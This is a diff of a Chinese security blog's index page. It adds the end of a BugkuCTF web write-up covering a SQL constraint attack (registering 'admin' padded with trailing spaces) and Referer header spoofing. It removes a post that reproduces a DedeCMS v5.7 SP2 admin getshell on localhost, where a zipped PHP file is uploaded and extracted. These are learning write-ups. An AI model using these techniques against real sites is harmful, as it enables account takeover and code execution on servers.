+<p>首先先说一下<code>SQL约束攻击</code>：</p>
+<ol>
+<li>在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。换句话说<code>&quot;admin&quot;</code>等同于<code>&quot;admin   &quot;</code>，对于绝大多数情况来说都是成立的（诸如WHERE子句中的字符串或INSERT语句中的字符串）例如以下语句的查询结果，与使用用户名”admin”进行查询时的结果是一样的</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username=&apos;admin   &apos;;</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>在所有的<code>INSERT</code>查询中，SQL都会根据varchar(n)来限制字符串的最大长度。也就是说，如果字符串的长度大于“n”个字符的话，那么仅使用字符串的前“n”个字符。比如特定列的长度约束为“5”个字符，那么在插入字符串“abcdefg”时，实际上只能插入字符串的前5个字符，即“abcde”</li>
+</ol>
+<p>知道条件的时候，我们就去注册一个账号，用户名为<code>&#39;admin     &#39;</code>（后面接5个空格，空格数量随意），密码符合条件随意就行</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/9-3.png" alt="9-3"></p>
+<p>然后直接用这个账号去登陆，拿到flag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/9-4.png" alt="9-4"></p>
+<p>也就是说，<code>注册</code>时使用<code>INSERT语句</code>帮我们插入一个用户名为<code>&#39;admin     &#39;</code>的账户</p>
+<p><code>登陆</code>时，帮我们删掉了用户名后面的空格，即查询了<code>&#39;admin&#39;</code>用户的信息</p>
+<hr>
+<h3 id="第三十关（你从哪里来）"><a href="#第三十关（你从哪里来）" class="headerlink" title="第三十关（你从哪里来）"></a>第三十关（你从哪里来）</h3><p>链接打开看到提示：<code>&quot;are you from google?&quot;</code></p>
+<p>那么这关考察的是<code>Http Referer</code>：</p>
+<ol>
+<li><p>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器藉此可以获得一些信息用于处理。比如从我主页上链接到一个朋友那里，他的服务器就能够从HTTP Referer中统计出每天有多少用户点击我主页上的链接访问他的网站</p>
+</li>
+<li><p>Referer的正确英语拼法是referrer。由于早期HTTP规范的拼写错误，为了保持向后兼容就将错就错了。其它网络技术的规范企图修正此问题，使用正确拼法，所以目前拼法不统一</p>
+</li>
+</ol>
+<p>我们可以自己测试一下，打开<code>https://www.baidu.com</code>，挂上<code>Burpsuits</code>的代理，随便点击一个可点链接</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/10-1.png" alt="10-1"></p>
+<p>看一下Burpsuit中请求头里长什么样</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/10-2.png" alt="10-2"></p>
+<p>果然是有<code>Referer</code>字段的，并且其内容是<code>https://www.baidu.com</code>，这就验证了我们的说法</p>
+<p>那现在开始做题。将请求头加上<code>Referer</code>字段，内容为<code>https://www.google.com</code>，拿下flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: https://www.google.com</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/10-3.png" alt="10-3"></p>
+<hr>
+<h3 id="至此，21-30关的Write-up结束"><a href="#至此，21-30关的Write-up结束" class="headerlink" title="至此，21-30关的Write-up结束"></a>至此，21-30关的Write-up结束</h3><h3 id="后一部分链接：第31-40关Write-up"><a href="#后一部分链接：第31-40关Write-up" class="headerlink" title="后一部分链接：第31-40关Write-up"></a>后一部分链接：<a href="https://knlvre.github.io/Knlvre.github-io/2019/04/10/BugKuCTF%E2%80%94Web%E9%A2%98%20%E7%AC%AC31-40%E5%85%B3/">第31-40关Write-up</a></h3>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">CTFWeb</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/Knlvre.github-io/2019/03/28/BugKuCTF—Web题 第21-30关/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-MySQL5数据库配置与管理" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -3098,119 +3332,6 @@
 
 
   
-    <article id="post-Web渗透学习—Dedecms v5.7 sp2后台getshell" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/02/28/Web渗透学习—Dedecms v5.7 sp2后台getshell/">Web渗透学习 — Dedecms v5.7 sp2后台getshell</a>
-    </h1>
-  
-
-        
-        <a href="/Knlvre.github-io/2019/02/28/Web渗透学习—Dedecms v5.7 sp2后台getshell/" class="archive-article-date">
-  	<time datetime="2019-02-27T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-28</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="【前言】"><a href="#【前言】" class="headerlink" title="【前言】"></a>【前言】</h2><p>本次学习参考这篇文章：<a href="https://xz.aliyun.com/t/4150" target="_blank" rel="noopener">Dedecms v5.7 sp2后台getshell</a></p>
-<p>大佬写的文章。而本文是想把自己的学习过程简单记录一下</p>
-<p>下载链接：<a href="http://updatenew.dedecms.com/base-v57/package/DedeCMS-V5.7-UTF8-SP2.tar.gz" target="_blank" rel="noopener">Dedecms v5.7 sp2</a></p>
-<hr>
-<h2 id="【步骤】"><a href="#【步骤】" class="headerlink" title="【步骤】"></a>【步骤】</h2><h3 id="一、创建文件"><a href="#一、创建文件" class="headerlink" title="一、创建文件"></a>一、创建文件</h3><p>先创建一个文件<strong>1.jpg.php</strong>，其中内容为：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>将这个文件压缩成<strong>ZIP</strong>格式的压缩文件</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/1-1.png" alt="1-1"></p>
-<hr>
-<h3 id="二、网站环境初始化"><a href="#二、网站环境初始化" class="headerlink" title="二、网站环境初始化"></a>二、网站环境初始化</h3><p>进入到这个本地网站环境：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/DedeCMS-V5.7-UTF8-SP2</span><br></pre></td></tr></table></figure>
-<p>点击<strong>uploads</strong>，按照提示的步骤对网站初始化</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/2-1.png" alt="2-1"></p>
-<hr>
-<h3 id="三、上传文件到指定位置"><a href="#三、上传文件到指定位置" class="headerlink" title="三、上传文件到指定位置"></a>三、上传文件到指定位置</h3><p>进入到后台：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/DedeCMS-V5.7-UTF8-SP2/uploads/dede/</span><br></pre></td></tr></table></figure>
-<p>默认登录的用户名和密码都是<strong>admin</strong></p>
-<p>进入 <strong>附件管理 — 文件式管理器</strong> 的 <strong>soft</strong> 文件夹中</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/3-1.png" alt="3-1"></p>
-<p>点击 <strong>文件上传</strong> 把刚才创建的 <strong>1.zip</strong> 压缩文件上传上去</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/3-2.png" alt="3-2"></p>
-<hr>
-<h3 id="四、发布刚才上传的文档"><a href="#四、发布刚才上传的文档" class="headerlink" title="四、发布刚才上传的文档"></a>四、发布刚才上传的文档</h3><p>访问这个地址：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/DedeCMS-V5.7-UTF8-SP2/uploads/dede/album_add.php</span><br></pre></td></tr></table></figure>
-<p>看到的是 <strong>发布新图集</strong> 的界面</p>
-<p>先点击右上角的 <strong>栏目管理 — 增加顶级栏目</strong> 创建一个栏目，这样下一步操作才能继续</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/4-1.png" alt="4-1"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/4-2.png" alt="4-2"></p>
-<p>然后简单填写一下图中那2栏必填的就可以点击确定了</p>
-<p>注意：<strong>内容模型</strong> 这一栏要选择 <strong>图片集</strong></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/4-3.png" alt="4-3"></p>
-<p>再次返回刚才 <strong>发布新图集</strong> 的界面，填写一下图中那几栏的信息</p>
-<p>勾选 <strong>从ZIP压缩包中提取文件</strong> 点击 <strong>浏览</strong> 选择刚才我们上传的 <strong>1.zip</strong></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/4-4.png" alt="4-4"></p>
-<hr>
-<h3 id="四、结果"><a href="#四、结果" class="headerlink" title="四、结果"></a>四、结果</h3><p>当提示 <strong>成功发布一个图集</strong> 时，点击 <strong>浏览文档</strong> </p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/5-1.png" alt="5-1"></p>
-<p>点击这个标签，就可以看到结果</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/5-2.png" alt="5-2"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/5-3.png" alt="5-3"></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Web渗透</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/02/28/Web渗透学习—Dedecms v5.7 sp2后台getshell/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
     <article id="post-Web渗透学习—常见PHP知识点" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -3433,11 +3554,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">CTF杂项</a>
+                <a href="javascript:void(0)" class="js-tag color1">CTF加密</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">CTF加密</a>
+                <a href="javascript:void(0)" class="js-tag color1">CTF杂项</a>
               </li>
              
               <li class="article-tag-list-item">
